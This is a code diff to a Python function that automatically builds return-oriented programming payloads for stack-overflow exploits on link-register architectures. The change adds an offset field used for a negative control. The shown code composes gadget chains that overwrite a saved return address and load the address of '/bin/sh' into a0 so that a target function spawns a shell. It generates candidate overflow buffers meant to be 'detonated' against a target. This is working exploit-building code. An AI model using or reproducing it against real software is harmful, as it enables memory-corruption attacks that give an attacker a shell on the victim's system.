@@ -96,8 +96,9 @@ def solve_lr_chain(data: bytes, arch: str, *, set_a0: int, call_va: int, offset:
     loader is a ret-terminated gadget that loads the caller's source + branch regs AND ra from the
     stack. The loader's entry sp lands at an offset in the overflow that the vulnerable frame decides,
     so this returns CANDIDATE payloads over that position for the caller to confirm (detonate +
-    negative control). Returns a list of {payload, caller, loader, stack_pos, sS, sB} (newest-compact
-    first), or [] when no loader+caller composes -- the honest 'cannot compose on this target'.
+    negative control). Returns a list of {payload, caller, loader, stack_pos, sS, sB, a0_off}
+    (newest-compact first; a0_off = the buffer offset of the bytes feeding a0, for a cheap negative
+    control), or [] when no loader+caller composes -- the honest 'cannot compose on this target'.
 
     One register only (a0). execve needs a1=a2=0 too; those need ra-restoring zeroing gadgets for
     a1/a2, which are arch/target-dependent (riscv libc lacks a clean a2/envp one) -- a multi-register
@@ -153,12 +154,13 @@ def solve_lr_chain(data: bytes, arch: str, *, set_a0: int, call_va: int, offset:
             for sp in range(*stack_range):
                 tot = sp + max(ld["regoff"][sS], ld["regoff"][sB], ld["raoff"]) + 2 * word
                 buf = bytearray(b"A" * tot)
+                a0_off = sp + ld["regoff"][sS]                     # buffer bytes that FEED a0 (=&sh)
                 buf[offset:offset + word] = p(ld["va"])            # overwritten saved ra -> loader
-                buf[sp + ld["regoff"][sS]:sp + ld["regoff"][sS] + word] = p(set_a0)   # sS = &"/bin/sh"
+                buf[a0_off:a0_off + word] = p(set_a0)              # sS = &"/bin/sh"
                 buf[sp + ld["regoff"][sB]:sp + ld["regoff"][sB] + word] = p(call_va)  # sB = target
                 buf[sp + ld["raoff"]:sp + ld["raoff"] + word] = p(cva)                # ra -> caller
                 out.append({"payload": bytes(buf), "caller": cva, "loader": ld["va"],
-                            "stack_pos": sp, "sS": sS, "sB": sB})
+                            "stack_pos": sp, "sS": sS, "sB": sB, "a0_off": a0_off})
                 if len(out) >= max_candidates:
                     return out
     return out
